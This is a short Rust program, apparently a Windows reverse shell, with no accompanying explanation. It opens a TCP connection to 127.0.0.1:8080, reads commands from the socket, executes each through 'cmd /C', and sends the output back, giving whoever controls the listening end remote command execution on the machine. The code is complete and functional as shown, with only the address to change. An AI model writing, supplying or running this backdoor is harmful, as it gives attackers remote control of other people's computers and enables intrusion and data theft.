use std::net::{TcpStream, ToSocketAddrs};
use std::io::{Read, Write};
use std::process::Command;

fn main() {
    let ip_addr = "127.0.0.1:8080";
    let remote_addr = ip_addr.to_socket_addrs().unwrap().next().unwrap();

    let mut stream = TcpStream::connect(remote_addr).unwrap();

    loop {
        let mut buffer = [0; 1024];
        match stream.read(&mut buffer) {
            Ok(n) => {
                if n == 0 {
                    break;
                } else {
                    let command = String::from_utf8_lossy(&buffer[..n]);

                    //convert command for passing to Command::new
                    let command = command.trim_end_matches(char::from(0));
    
                    // Execute the command in a child process
                    let output = Command::new("cmd")
                        .args(&["/C", command])
                        .output()
                        .expect("failed to execute process");

                    // Write the output to the socket
                    stream.write(&output.stdout).unwrap();
                }
            }
            Err(e) => println!("Error: {}", e)
        }
    }
}